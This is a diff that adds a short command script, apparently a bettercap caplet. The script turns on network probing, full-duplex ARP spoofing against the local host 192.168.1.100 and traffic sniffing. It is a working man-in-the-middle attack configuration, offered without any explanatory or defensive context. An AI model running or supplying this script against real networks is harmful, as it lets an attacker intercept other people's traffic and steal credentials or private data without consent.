@@ -1,0 +1,8 @@
+
+net.probe on    
+set arp.spoof.fullduplex true
+set arp.spoof.targets 192.168.1.100
+set events.stream.output detailed
+set net.sniff.local false
+arp.spoof on
+net.sniff on
